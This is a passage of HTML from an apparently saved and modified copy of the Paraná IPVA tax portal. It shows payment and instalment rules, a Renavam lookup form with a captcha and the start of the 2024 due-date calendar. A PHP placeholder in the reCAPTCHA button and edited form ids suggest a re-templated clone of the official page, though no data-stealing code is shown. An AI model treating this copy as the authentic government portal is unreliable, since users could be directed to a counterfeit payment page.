                                                                                width="5" height="5"
                                                                                style="vertical-align:middle;"><a
                                                                                id="pt1:r1:0:l2"
                                                                                class="xgn p_AFTextOnly"
                                                                                data-afr-fcs="true"
                                                                                href="https://apps.apple.com/us/app/servi%C3%A7os-r%C3%A1pidos/id1613796501"
                                                                                target="_blank" data-afr-tlen="5"
                                                                                role="link"><span id="pt1:r1:0:l2::text"
                                                                                    class="x17w">(IOS)</span></a><img
                                                                                id="pt1:r1:0:s21"
                                                                                src="./PortalPVAPR_files/t.gif" alt=""
                                                                                width="5" height="5"
                                                                                style="vertical-align:middle;"><span
                                                                                class="x250">e</span><img
                                                                                id="pt1:r1:0:s22"
                                                                                src="./PortalPVAPR_files/t.gif" alt=""
                                                                                width="5" height="5"
                                                                                style="vertical-align:middle;"><a
                                                                                id="pt1:r1:0:l4"
                                                                                class="xgn p_AFTextOnly"
                                                                                data-afr-fcs="true"
                                                                                href="https://play.google.com/store/apps/details?id=br.gov.pr.celepar.receita.servicos&amp;pli=1"
                                                                                target="_blank" data-afr-tlen="9"
                                                                                role="link"><span id="pt1:r1:0:l4::text"
                                                                                    class="x17w">(Android)</span></a></span>
                                                                    </td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                    <div><img id="pt1:r1:0:s18" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div>
                                                        <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                            role="presentation" id="pt1:r1:0:pgl26" class="x1a"
                                                            style="padding-left:20px;">
                                                            <tbody>
                                                                <tr>
                                                                    <td valign="middle"><img id="pt1:r1:0:i5"
                                                                            class="xl0"
                                                                            src="./PortalPVAPR_files/icon_mark.png">
                                                                    </td>
                                                                    <td valign="middle"><img id="pt1:r1:0:s19"
                                                                            src="./PortalPVAPR_files/t.gif" alt=""
                                                                            width="10" height="10"
                                                                            style="vertical-align:middle;"></td>
                                                                    <td valign="middle"><span id="pt1:r1:0:pgl27"
                                                                            class="x1a"><span class="x250">Por meio de
                                                                                cartão de crédito para o exercício de
                                                                                2024, em até 12 parcelas, por meio de
                                                                                empresas terceirizadas </span><img
                                                                                id="pt1:r1:0:s20"
                                                                                src="./PortalPVAPR_files/t.gif" alt=""
                                                                                width="5" height="5"
                                                                                style="vertical-align:middle;"><a
                                                                                id="pt1:r1:0:l3"
                                                                                class="xgn p_AFTextOnly"
                                                                                data-afr-fcs="true"
                                                                                href="http://www.fazenda.pr.gov.br/Pagina/Empresas-credenciadas-para-pagamento-do-IPVA-com-cartao-de-credito"
                                                                                target="_blank" data-afr-tlen="18"
                                                                                role="link"><span id="pt1:r1:0:l3::text"
                                                                                    class="x17w">(mais
                                                                                    informações)</span></a></span></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                    <div><img id="pt1:r1:0:s15" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div><span id="pt1:r1:0:pgl55" class="x1a"><img id="pt1:r1:0:i35"
                                                                class="xl0" src="./PortalPVAPR_files/icon_mark.png"><img
                                                                id="pt1:r1:0:s65" src="./PortalPVAPR_files/t.gif" alt=""
                                                                width="10" height="10"
                                                                style="vertical-align:middle;"><span class="x250"
                                                                style="font-weight: bold;">Observações:</span></span>
                                                    </div>
                                                    <div><img id="pt1:r1:0:s146" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div>
                                                        <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                            role="presentation" id="pt1:r1:0:pgl56" class="x1a"
                                                            style="padding-left:20px;">
                                                            <tbody>
                                                                <tr>
                                                                    <td valign="middle"><img id="pt1:r1:0:i36"
                                                                            class="xl0"
                                                                            style="vertical-align: top !important;"
                                                                            src="./PortalPVAPR_files/icon_mark.png">
                                                                    </td>
                                                                    <td valign="middle"><img id="pt1:r1:0:s66"
                                                                            src="./PortalPVAPR_files/t.gif" alt=""
                                                                            width="10" height="10"
                                                                            style="vertical-align:middle;"></td>
                                                                    <td valign="middle"><span class="x250">As dívidas
                                                                            ativas desvinculadas do veículo (oriundas de
                                                                            aquisições em leilão ou determinações
                                                                            judiciais) podem ser quitadas com a emissão
                                                                            de guia para pagamento do IPVA;</span></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                    <div><img id="pt1:r1:0:s147" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div>
                                                        <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                            role="presentation" id="pt1:r1:0:pgl57" class="x1a"
                                                            style="padding-left:20px;">
                                                            <tbody>
                                                                <tr>
                                                                    <td valign="middle"><img id="pt1:r1:0:i37"
                                                                            class="xl0"
                                                                            src="./PortalPVAPR_files/icon_mark.png">
                                                                    </td>
                                                                    <td valign="middle"><img id="pt1:r1:0:s67"
                                                                            src="./PortalPVAPR_files/t.gif" alt=""
                                                                            width="10" height="10"
                                                                            style="vertical-align:middle;"></td>
                                                                    <td valign="middle"><span class="x250">Prazo de
                                                                            compensação:</span></td>
                                                                    <td valign="middle"><img id="pt1:r1:0:s148"
                                                                            src="./PortalPVAPR_files/t.gif" alt=""
                                                                            width="5" height="5"
                                                                            style="vertical-align:middle;"></td>
                                                                    <td valign="middle"><span class="x250"
                                                                            style="color:Red; font-weight:bold;"> até um
                                                                            dia útil após o pagamento.</span></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                    <div><img id="pt1:r1:0:s10123" src="./PortalPVAPR_files/t.gif"
                                                            alt="" width="10" height="10"
                                                            style="vertical-align:middle;"></div>
                                                    <div><span id="pt1:r1:0:pgl23" class="x1a"><span class="x24e">Como
                                                                parcelar o IPVA:</span></span></div>
                                                    <div><img id="pt1:r1:0:s1019" src="./PortalPVAPR_files/t.gif" alt=""
                                                            width="10" height="10" style="vertical-align:middle;"></div>
                                                    <div>
                                                        <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                            role="presentation" id="pt1:r1:0:pgl8" class="x1a">
                                                            <tbody>
                                                                <tr>
                                                                    <td valign="middle"><img id="pt1:r1:0:i38"
                                                                            class="xl0"
                                                                            src="./PortalPVAPR_files/icon_mark.png">
                                                                    </td>
                                                                    <td valign="middle"><img id="pt1:r1:0:s68"
                                                                            src="./PortalPVAPR_files/t.gif" alt=""
                                                                            width="10" height="10"
                                                                            style="vertical-align:middle;"></td>
                                                                    <td valign="middle"><span class="x250">Consultar
                                                                            Débitos e Guias para pagar o IPVA/PR com o
                                                                            número do Renavam ou Acessar o Menu Serviços
                                                                            Parcelamento de IPVA;</span></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                    <div><img id="pt1:r1:0:s10191" src="./PortalPVAPR_files/t.gif"
                                                            alt="" width="10" height="10"
                                                            style="vertical-align:middle;"></div>
                                                    <div>
                                                        <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                            role="presentation" id="pt1:r1:0:pgl911" class="x1a">
                                                            <tbody>
                                                                <tr>
                                                                    <td valign="middle"><img id="pt1:r1:0:i89"
                                                                            class="xl0"
                                                                            src="./PortalPVAPR_files/icon_mark.png">
                                                                    </td>
                                                                    <td valign="middle"><img id="pt1:r1:0:s69"
                                                                            src="./PortalPVAPR_files/t.gif" alt=""
                                                                            width="10" height="10"
                                                                            style="vertical-align:middle;"></td>
                                                                    <td valign="middle"><span class="x250">É possível
                                                                            parcelar os débitos de IPVA de exercícios
                                                                            anteriores ao atual;</span></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                    <div><img id="pt1:r1:0:s10192" src="./PortalPVAPR_files/t.gif"
                                                            alt="" width="10" height="10"
                                                            style="vertical-align:middle;"></div>
                                                    <div>
                                                        <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                            role="presentation" id="pt1:r1:0:pgl91" class="x1a">
                                                            <tbody>
                                                                <tr>
                                                                    <td valign="middle"><img id="pt1:r1:0:i891"
                                                                            class="xl0"
                                                                            style="vertical-align: top !important;"
                                                                            src="./PortalPVAPR_files/icon_mark.png">
                                                                    </td>
                                                                    <td valign="middle"><img id="pt1:r1:0:s691"
                                                                            src="./PortalPVAPR_files/t.gif" alt=""
                                                                            width="10" height="10"
                                                                            style="vertical-align:middle;"></td>
                                                                    <td valign="middle"><span class="x250">O
                                                                            parcelamento pode chegar a até 10 parcelas,
                                                                            respeitado o valor mínimo da parcela de 1
                                                                            UPF. Caso haja ajuizamento ou protesto de
                                                                            dívidas ativas, será necessário procurar a
                                                                            PGE para pagamento de custas e
                                                                            honorários;</span></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                    <div><img id="pt1:r1:0:s10193" src="./PortalPVAPR_files/t.gif"
                                                            alt="" width="10" height="10"
                                                            style="vertical-align:middle;"></div>
                                                    <div>
                                                        <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                            role="presentation" id="pt1:r1:0:pgl92" class="x1a">
                                                            <tbody>
                                                                <tr>
                                                                    <td valign="middle"><img id="pt1:r1:0:i892"
                                                                            class="xl0"
                                                                            src="./PortalPVAPR_files/icon_mark.png">
                                                                    </td>
                                                                    <td valign="middle"><img id="pt1:r1:0:s692"
                                                                            src="./PortalPVAPR_files/t.gif" alt=""
                                                                            width="10" height="10"
                                                                            style="vertical-align:middle;"></td>
                                                                    <td valign="middle"><span class="x250">O pagamento
                                                                            das parcelas deverá ser feito nos bancos
                                                                            credenciados, com emissão de cada parcela em
                                                                            seu mês de referência;</span></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                    <div><img id="pt1:r1:0:s10194" src="./PortalPVAPR_files/t.gif"
                                                            alt="" width="10" height="10"
                                                            style="vertical-align:middle;"></div>
                                                    <div>
                                                        <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                            role="presentation" id="pt1:r1:0:pgl94" class="x1a">
                                                            <tbody>
                                                                <tr>
                                                                    <td valign="middle"><img id="pt1:r1:0:i894"
                                                                            class="xl0"
                                                                            src="./PortalPVAPR_files/icon_mark.png">
                                                                    </td>
                                                                    <td valign="middle"><img id="pt1:r1:0:s694"
                                                                            src="./PortalPVAPR_files/t.gif" alt=""
                                                                            width="10" height="10"
                                                                            style="vertical-align:middle;"></td>
                                                                    <td valign="middle"><span class="x250">Quem pode
                                                                            parcelar: proprietário, comprador do veículo
                                                                            registrado no Detran/PR ou arrendatário de
                                                                            veículo.</span></td>
                                                                </tr>
                                                            </tbody>
                                                        </table>
                                                    </div>
                                                </div>
                                            </td>
                                            <td valign="top" class="boxlog">
                                                <div id="pt1:r1:0:r2" class="xui" style="margin-top:0px;"
                                                    aria-live="polite"><span id="pt1:r1:0:r2:0:pgl1" class="x284 x1a">
                                                        <div id="pt1:r1:0:r2:0:ig1:pgl11" class="x27e ipva-group x1a">
                                                            <div>
                                                                <div id="pt1:r1:0:r2:0:ig1:pgl13" class="x27g x1a">
                                                                    <div>
                                                                        <div id="pt1:r1:0:r2:0:ig1:pgl2" class="x1a">
                                                                            <div><img id="pt1:r1:0:r2:0:ig1:s1"
                                                                                    src="./PortalPVAPR_files/t.gif"
                                                                                    alt="" width="10" height="5"
                                                                                    style="vertical-align:middle;">
                                                                            </div>
                                                                            <div><span class="x244">Consultar Débitos e
                                                                                    Guias para pagar o IPVA/PR</span>
                                                                            </div>
                                                                            <div><img id="pt1:r1:0:r2:0:ig1:s3"
                                                                                    src="./PortalPVAPR_files/t.gif"
                                                                                    alt="" width="10" height="5"
                                                                                    style="vertical-align:middle;">
                                                                            </div>
                                                                            <div>
                                                                                <div id="pt1:r1:0:r2:0:ig1:pfl1"
                                                                                    class="x19">
                                                                                    <table cellpadding="0"
                                                                                        cellspacing="0" border="0"
                                                                                        summary="" role="presentation"
                                                                                        style="width: 100%">
                                                                                        <tbody>
                                                                                            <tr>
                                                                                                <td class="x4w"
                                                                                                    colspan="1">
                                                                                                    <table
                                                                                                        cellpadding="0"
                                                                                                        cellspacing="0"
                                                                                                        border="0"
                                                                                                        width="100%"
                                                                                                        summary=""
                                                                                                        role="presentation">
                                                                                                        <tbody>
                                                                                                            <tr>
                                                                                                                <td>
                                                                                                                    <table
                                                                                                                        class="xsz x1u"
                                                                                                                        id="pt1:r1:0:r2:0:ig1:it1"
                                                                                                                        cellpadding="0"
                                                                                                                        cellspacing="0"
                                                                                                                        border="0"
                                                                                                                        summary=""
                                                                                                                        role="presentation">
                                                                                                                        <tbody>
                                                                                                                            <tr>
                                                                                                                                <td
                                                                                                                                    class="xu x50">
                                                                                                                                    <label
                                                                                                                                        class="af_inputText_label-text"
                                                                                                                                        for="renavam">*
                                                                                                                                        Renavam</label>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                            <tr>
                                                                                                                                <td valign="top"
                                                                                                                                    nowrap=""
                                                                                                                                    class="xvo">
                                                                                                                                    <input
                                                                                                                                        id="renavam"
                                                                                                                                        autofocus
                                                                                                                                        name="pt1:r1:0:r2:0:ig1:it1"
                                                                                                                                        style="min-width: 100%"
                                                                                                                                        class="x25 eventsD"
                                                                                                                                        size="0"
                                                                                                                                        maxlength="11"
                                                                                                                                        placeholder="Digite o Renavam "
                                                                                                                                        type="text">
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                        </tbody>
                                                                                                                    </table>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                        </tbody>
                                                                                                    </table>
                                                                                                </td>
                                                                                            </tr>
                                                                                        </tbody>
                                                                                    </table>
                                                                                </div>
                                                                            </div>
                                                                            <div>
                                                                                <div id="pt1:r1:0:r2:0:ig1:pfl2"
                                                                                    class="x19">
                                                                                    <table cellpadding="0"
                                                                                        cellspacing="0" border="0"
                                                                                        summary="" role="presentation"
                                                                                        style="width: 100%">
                                                                                        <tbody>
                                                                                            <tr>
                                                                                                <td class="x4w"
                                                                                                    colspan="1"
                                                                                                    width="50%">
                                                                                                    <table
                                                                                                        cellpadding="0"
                                                                                                        cellspacing="0"
                                                                                                        border="0"
                                                                                                        width="100%"
                                                                                                        summary=""
                                                                                                        role="presentation">
                                                                                                        <tbody>
                                                                                                            <tr>
                                                                                                                <td>
                                                                                                                    <table
                                                                                                                        class="xsz x1z"
                                                                                                                        style="display:none"
                                                                                                                        id="pt1:r1:0:r2:0:ig1:soc1"
                                                                                                                        cellpadding="0"
                                                                                                                        cellspacing="0"
                                                                                                                        border="0"
                                                                                                                        summary=""
                                                                                                                        role="presentation">
                                                                                                                        <tbody>
                                                                                                                            <tr>
                                                                                                                                <td
                                                                                                                                    class="x12 x50">
                                                                                                                                    <label
                                                                                                                                        class="af_selectOneChoice_label-text"
                                                                                                                                        for="pt1:r1:0:r2:0:ig1:soc1::content">*
                                                                                                                                        Data
                                                                                                                                        de
                                                                                                                                        Pagamento</label>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                            <tr>
                                                                                                                                <td valign="top"
                                                                                                                                    nowrap=""
                                                                                                                                    class="xvo">
                                                                                                                                    <select
                                                                                                                                        id="pt1:r1:0:r2:0:ig1:soc1::content"
                                                                                                                                        name="pt1:r1:0:r2:0:ig1:soc1"
                                                                                                                                        class="x2h"
                                                                                                                                        title="14">
                                                                                                                                        <option
                                                                                                                                            value="0"
                                                                                                                                            selected="">
                                                                                                                                            14
                                                                                                                                        </option>
                                                                                                                                        <option
                                                                                                                                            value="1">
                                                                                                                                            15
                                                                                                                                        </option>
                                                                                                                                        <option
                                                                                                                                            value="2">
                                                                                                                                            16
                                                                                                                                        </option>
                                                                                                                                        <option
                                                                                                                                            value="3">
                                                                                                                                            19
                                                                                                                                        </option>
                                                                                                                                        <option
                                                                                                                                            value="4">
                                                                                                                                            20
                                                                                                                                        </option>
                                                                                                                                        <option
                                                                                                                                            value="5">
                                                                                                                                            21
                                                                                                                                        </option>
                                                                                                                                        <option
                                                                                                                                            value="6">
                                                                                                                                            22
                                                                                                                                        </option>
                                                                                                                                        <option
                                                                                                                                            value="7">
                                                                                                                                            23
                                                                                                                                        </option>
                                                                                                                                        <option
                                                                                                                                            value="8">
                                                                                                                                            26
                                                                                                                                        </option>
                                                                                                                                        <option
                                                                                                                                            value="9">
                                                                                                                                            27
                                                                                                                                        </option>
                                                                                                                                        <option
                                                                                                                                            value="10">
                                                                                                                                            28
                                                                                                                                        </option>
                                                                                                                                        <option
                                                                                                                                            value="11">
                                                                                                                                            29
                                                                                                                                        </option>
                                                                                                                                    </select>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                        </tbody>
                                                                                                                    </table>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                        </tbody>
                                                                                                    </table>
                                                                                                </td>
                                                                                                <td class="x4w"
                                                                                                    colspan="1">
                                                                                                    <table
                                                                                                        cellpadding="0"
                                                                                                        cellspacing="0"
                                                                                                        border="0"
                                                                                                        width="100%"
                                                                                                        summary=""
                                                                                                        role="presentation">
                                                                                                        <tbody>
                                                                                                            <tr>
                                                                                                                <td>
                                                                                                                    <table
                                                                                                                        class="xsz x1u p_AFDisabled"
                                                                                                                        style="display:none"
                                                                                                                        id="pt1:r1:0:r2:0:ig1:it3"
                                                                                                                        cellpadding="0"
                                                                                                                        cellspacing="0"
                                                                                                                        border="0"
                                                                                                                        summary=""
                                                                                                                        role="presentation">
                                                                                                                        <tbody>
                                                                                                                            <tr>
                                                                                                                                <td
                                                                                                                                    class="xu x50">
                                                                                                                                    <label
                                                                                                                                        class="af_inputText_label-text"
                                                                                                                                        for="pt1:r1:0:r2:0:ig1:it3::content">
                                                                                                                                    </label>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                            <tr>
                                                                                                                                <td valign="top"
                                                                                                                                    nowrap=""
                                                                                                                                    class="xvo">
                                                                                                                                    <input
                                                                                                                                        id="pt1:r1:0:r2:0:ig1:it3::content"
                                                                                                                                        name="pt1:r1:0:r2:0:ig1:it3"
                                                                                                                                        disabled=""
                                                                                                                                        style="min-width:100%;"
                                                                                                                                        class="x25"
                                                                                                                                        type="text"
                                                                                                                                        value="02/2024">
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                        </tbody>
                                                                                                                    </table>
                                                                                                                </td>
                                                                                                            </tr>
                                                                                                        </tbody>
                                                                                                    </table>
                                                                                                </td>
                                                                                            </tr>
                                                                                        </tbody>
                                                                                    </table>
                                                                                </div>
                                                                            </div>
                                                                            <div><img id="pt1:r1:0:r2:0:ig1:s4"
                                                                                    src="./PortalPVAPR_files/t.gif"
                                                                                    alt="" width="15" height="15"
                                                                                    style="vertical-align:middle;">
                                                                            </div>
                                                                            <div><img id="pt1:r1:0:r2:0:ig1:captcha"
                                                                                    title="captcha" alt="captcha"
                                                                                    class="captchaservlet xl0"
                                                                                    style="width:251px; height:76.0px;"
                                                                                    src="./PortalPVAPR_files/captchaservlet">
                                                                            </div>
                                                                            <div><a id="pt1:r1:0:r2:0:ig1:cb2"
                                                                                    class="a-link xgn p_AFTextOnly"
                                                                                    data-afr-fcs="true"
                                                                                    onclick="this.focus();return false"
                                                                                    data-afr-tlen="17" role="link"><span
                                                                                        id="pt1:r1:0:r2:0:ig1:cb2::text"
                                                                                        class="x17w">Recarregar
                                                                                        imagem</span></a></div>
                                                                            <div><img id="pt1:r1:0:r2:0:ig1:s5"
                                                                                    src="./PortalPVAPR_files/t.gif"
                                                                                    alt="" width="10" height="10"
                                                                                    style="vertical-align:middle;">
                                                                            </div>
                                                                            <div><span id="pt1:r1:0:r2:0:ig1:it2"
                                                                                    class="xsz x1u"><input
                                                                                        id="recaptcharesponse"
                                                                                        name="pt1:r1:0:r2:0:ig1:it2"
                                                                                        style="min-width:100%;"
                                                                                        class="x25 eventsD" type="text"><label
                                                                                        for="recaptcharesponse"
                                                                                        class="x9w"> </label></span>
                                                                            </div>
                                                                            <div><img id="pt1:r1:0:r2:0:ig1:s6"
                                                                                    src="./PortalPVAPR_files/t.gif"
                                                                                    alt="" width="10" height="10"
                                                                                    style="vertical-align:middle;">
                                                                            </div>
                                                                            <div>
                                                                                <div id="pt1:r1:0:r2:0:ig1:b1"
                                                                                    class="x289 xfl p_AFTextOnly "
                                                                                    _afrgrp="0" role="presentation"
                                                                                   ><a  class="xfn g-recaptcha" aria-label="CONSULTAR" 
                                                                                    data-sitekey="<?=$Recaptcha_Key?>"
                                                                                    data-callback='onSubmit'  onclick="validateRecaptcha()"
                                                                                    data-action='submit'
                                                                                   data-init-validate-real-time=""
                                                                                        role="button"><span
                                                                                            class="xfv">CONSULTAR</span></a>
                                                                                </div>
                                                                            </div>
                                                                        </div>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </span>
                                                    <div style="display:none"><a id="pt1:r1:0:r2:0:_afrCommandDelegate"
                                                            class="xgl" onclick="this.focus();return false;"
                                                            data-afr-fcs="true"></a>
                                                    </div>
                                                </div>
                                            </td>
                                        </tr>
                                    </tbody>
                                </table>
                                <div id="pt1:r1:0:j_id__ctru211pc2" style="margin-top:20px"></div><span
                                    id="pt1:r1:0:pgl4" class="x1a">
                                    <div id="pt1:r1:0:j_id__ctru213pc2" class="xsz x26v x1a"
                                        style="background-color: #F9F9F9; border: solid 1px #F1F1F1; padding-top: 20px; padding-bottom: 20px;">
                                        <div>
                                            <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                role="presentation" id="pt1:r1:0:pgl9" class="x1a">
                                                <tbody>
                                                    <tr>
                                                        <td><span class="x23x" style="font-size:20px;">Calendário de
                                                                vencimento IPVA 2024</span></td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                        <div>
                                            <table cellpadding="0" cellspacing="0" border="0" summary=""
                                                role="presentation" id="pt1:r1:0:pgl10" class="x1a">
                                                <tbody>
                                                    <tr>
                                                        <td><span class="x250">Resolução SEFA nº 1304/2023, publicada em
                                                                DOE nº 11559 de 11/12/2023.</span></td>
                                                    </tr>
                                                </tbody>
                                            </table>
                                        </div>
                                        <div>
                                            <div id="pt1:r1:0:j_id__ctru218pc2" style="margin-top:25px"></div>
                                        </div>
                                        <div>
                                            <div id="pt1:r1:0:r1" class="xui" aria-live="polite">
                                                <div id="pt1:r1:0:r1:0:pt1" class="minhaArea xlt p_AFTopTabs"
                                                    style="width:auto;overflow:visible;height:auto">
                                                    <div style="height:33px">
                                                        <div class="x139" style="height:33px;left:0px;right:0px"><span
                                                                class="xs6"></span></div>
                                                        <div id="pt1:r1:0:r1:0:pt1::tabh" role="tablist"
                                                            style="height:33px;left:0;right:0"
                                                            _afrdistab="pt1:r1:0:r1:0:sdi1" class="xll">
                                                            <div role="presentation" class="xm3">
                                                                <div id="pt1:r1:0:r1:0:pt1::tabh::scbi"
                                                                    aria-label="Rolar à esquerda" role="button"
                                                                    class="xm9"><img
                                                                        src="./PortalPVAPR_files/conv_l_ena.png"
                                                                        border="0" alt=""></div>
                                                                <div id="pt1:r1:0:r1:0:pt1::tabh::cbc"
                                                                    role="presentation" class="xm5">
                                                                    <div role="presentation" id="pt1:r1:0:r1:0:sdi1::ti"
                                                                        _afrptkey="pt1:r1:0:r1:0:sdi1"
                                                                        class="xb7 p_AFSelected">
                                                                        <div role="presentation" class="x13j">
                                                                            <div role="presentation"
                                                                                id="pt1:r1:0:r1:0:sdi1::ti::_afrTabCnt"
                                                                                class="x13t"><a role="tab"
                                                                                    aria-controls="pt1:r1:0:r1:0:sdi1::body"
                                                                                    id="pt1:r1:0:r1:0:sdi1::disAcr"
                                                                                    class="x13v p_AFSelected"
                                                                                    aria-selected="true" tabindex="0"
                                                                                    data-afr-fcs="true"
                                                                                    onclick="return false;">Pagamento à
                                                                                    Vista</a></div>
                                                                            <div class="x10e"
                                                                                id="pt1:r1:0:r1:0:sdi1::ti::_afrEps"
                                                                                style="display: none;">…</div>
                                                                        </div>
                                                                    </div>
                                                                    <div role="presentation" id="pt1:r1:0:r1:0:sdi2::ti"
                                                                        _afrptkey="pt1:r1:0:r1:0:sdi2" class="xb7">
                                                                        <div role="presentation" class="x13j">
                                                                            <div role="presentation"
                                                                                id="pt1:r1:0:r1:0:sdi2::ti::_afrTabCnt"
                                                                                class="x13t"><a role="tab"
                                                                                    aria-controls="pt1:r1:0:r1:0:sdi2::body"
                                                                                    id="pt1:r1:0:r1:0:sdi2::disAcr"
                                                                                    class="x13v" data-afr-fcs="true"
                                                                                    tabindex="-1"
                                                                                    onclick="return false;">Pagamento
                                                                                    Parcelado</a></div>
                                                                            <div class="x10e"
                                                                                id="pt1:r1:0:r1:0:sdi2::ti::_afrEps"
                                                                                style="display: none;">…</div>
                                                                        </div>
                                                                    </div>
                                                                    <div class="xm7" id="pt1:r1:0:r1:0:pt1::tabh::cbs">
                                                                    </div>
                                                                </div>
                                                                <div id="pt1:r1:0:r1:0:pt1::tabh::ecbi"
                                                                    aria-label="Rolar à direita" role="button"
                                                                    class="xmb"><img
                                                                        src="./PortalPVAPR_files/conv_r_ena.png"
                                                                        border="0" alt=""></div>
                                                                <div id="pt1:r1:0:r1:0:pt1::tabh::cbdli"
                                                                    title="Lista todas as guias"
                                                                    aria-label="Lista todas as guias" role="button"
                                                                    aria-haspopup="true" class="xlp"><img
                                                                        src="./PortalPVAPR_files/dropdown_n.png"
                                                                        border="0" title="Lista todas as guias"
                                                                        alt="Lista todas as guias">
                                                                    <div id="pt1:r1:0:r1:0:pt1::tabh::dlc" class="xlz">
                                                                        <table cellpadding="0" cellspacing="0"
                                                                            style="width: 100%;">
                                                                            <tbody>
                                                                                <tr _afrptkey="pt1:r1:0:r1:0:sdi1">
                                                                                    <td></td>
                                                                                    <td style="width: 100%;">
                                                                                        <div class="xlx"><a role="tab"
                                                                                                aria-controls="pt1:r1:0:r1:0:sdi1::body"
                                                                                                id="pt1:r1:0:r1:0:sdi1::disAcrCnvr"
                                                                                                class="x13v p_AFSelected"
                                                                                                aria-selected="true"
                                                                                                tabindex="0"
                                                                                                data-afr-fcs="true"
                                                                                                onclick="return false;">Pagamento
                                                                                                à Vista</a></div>
                                                                                    </td>
                                                                                    <td></td>
                                                                                </tr>
                                                                            </tbody>
                                                                        </table>
                                                                        <table cellpadding="0" cellspacing="0"
                                                                            style="width: 100%;">
                                                                            <tbody>
                                                                                <tr _afrptkey="pt1:r1:0:r1:0:sdi2">
                                                                                    <td></td>
                                                                                    <td style="width: 100%;">
                                                                                        <div class="xlx"><a role="tab"
                                                                                                aria-controls="pt1:r1:0:r1:0:sdi2::body"
                                                                                                id="pt1:r1:0:r1:0:sdi2::disAcrCnvr"
                                                                                                class="x13v"
                                                                                                data-afr-fcs="true"
                                                                                                tabindex="-1"
                                                                                                onclick="return false;">Pagamento
                                                                                                Parcelado</a></div>
                                                                                    </td>
                                                                                    <td></td>
                                                                                </tr>
                                                                            </tbody>
                                                                        </table>
                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>
                                                    </div>
                                                    <table cellpadding="0" cellspacing="0" border="0" width="100%"
                                                        summary="" role="presentation" style="table-layout:fixed">
                                                        <tbody>
                                                            <tr>
                                                                <td style="width:100%" class="x13b"
                                                                    id="pt1:r1:0:r1:0:pt1::tabb">
                                                                    <div id="pt1:r1:0:r1:0:pt1::tabbc"
                                                                        class="x13c p_AFFlow">
                                                                        <div id="pt1:r1:0:r1:0:sdi1::body"
                                                                            role="tabpanel" aria-hidden="false"
                                                                            style="">
                                                                            <div id="pt1:r1:0:r1:0:sdi1"
                                                                                class="af_showDetailItem">
                                                                                <div id="pt1:r1:0:r1:0:r1" class="xui"
                                                                                    aria-live="polite">
                                                                                    <div id="pt1:r1:0:r1:0:r1:0:pgl5"
                                                                                        class="xsz x1a">
                                                                                        <div><img
                                                                                                id="pt1:r1:0:r1:0:r1:0:s2"
                                                                                                src="./PortalPVAPR_files/t.gif"
                                                                                                alt="" width="10"
                                                                                                height="10"
                                                                                                style="vertical-align:middle;">
                                                                                        </div>
                                                                                        <div>
                                                                                            <table cellpadding="0"
                                                                                                cellspacing="0"
                                                                                                border="0" summary=""
                                                                                                role="presentation"
                                                                                                align="center"
                                                                                                id="pt1:r1:0:r1:0:r1:0:pgl4"
                                                                                                class="x1a">
                                                                                                <tbody>
                                                                                                    <tr>
                                                                                                        <td>
                                                                                                            <div align="center"
                                                                                                                id="pt1:r1:0:r1:0:r1:0:pgl3"
                                                                                                                class="x1a">
                                                                                                                <div>
                                                                                                                    <table
                                                                                                                        cellpadding="0"
                                                                                                                        cellspacing="0"
                                                                                                                        border="0"
                                                                                                                        summary=""
                                                                                                                        role="presentation"
                                                                                                                        align="center"
                                                                                                                        id="pt1:r1:0:r1:0:r1:0:pgl1"
                                                                                                                        class="xsz x1a">
                                                                                                                        <tbody>
                                                                                                                            <tr>
                                                                                                                                <td><span
                                                                                                                                        id="pt1:r1:0:r1:0:r1:0:ot3"
                                                                                                                                        class="x23w xq"><label>Prazo
                                                                                                                                            de
                                                                                                                                            Pagamento
                                                                                                                                            IPVA
                                                                                                                                            2024</label></span>
                                                                                                                                </td>
                                                                                                                            </tr>
                                                                                                                        </tbody>
                                                                                                                    </table>
                                                                                                                </div>
                                                                                                                <div>
                                                                                                                    <table
                                                                                                                        cellpadding="0"
                                                                                                                        cellspacing="0"
                                                                                                                        border="0"
                                                                                                                        summary=""
                                                                                                                        role="presentation"
                                                                                                                        align="center"
                                                                                                                        id="pt1:r1:0:r1:0:r1:0:pgl2"
                                                                                                                        class="x1a">
                                                                                                                        <tbody>
                                                                                                                            <tr>
                                                                                                                                <td><span
                                                                                                                                        class="x24k"
                                                                                                                                        style="white-space:nowrap;">Janeiro
                                                                                                                                        de
                                                                                                                                        2024</span>
                                                                                                                                </td>
                                                                                                                                <td><span
